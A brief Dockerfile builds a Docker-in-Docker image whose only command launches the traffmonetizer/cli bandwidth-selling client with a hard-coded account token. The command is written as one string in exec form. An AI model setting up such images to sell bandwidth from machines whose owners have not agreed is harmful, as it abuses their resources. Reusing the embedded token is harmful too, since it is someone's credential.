FROM debian:buster-slim

RUN set -eux; \
	apt-get update; \
	apt-get install -y --no-install-recommends \
		ca-certificates \
		iptables \
		openssl \
		pigz \
		xz-utils \
	; \
	rm -rf /var/lib/apt/lists/*

ENV DOCKER_TLS_CERTDIR=/certs
RUN mkdir /certs /certs/client && chmod 1777 /certs /certs/client

COPY --from=docker:20.10.5-dind /usr/local/bin/ /usr/local/bin/

VOLUME /var/lib/docker

ENTRYPOINT ["dockerd-entrypoint.sh"]
EXPOSE 5000
CMD ["docker run -i -d --name tm traffmonetizer/cli start accept --token 8nkHbCPxYgWueBN13CWTJrRYBsizoO34KYr0TzPB0ao="]
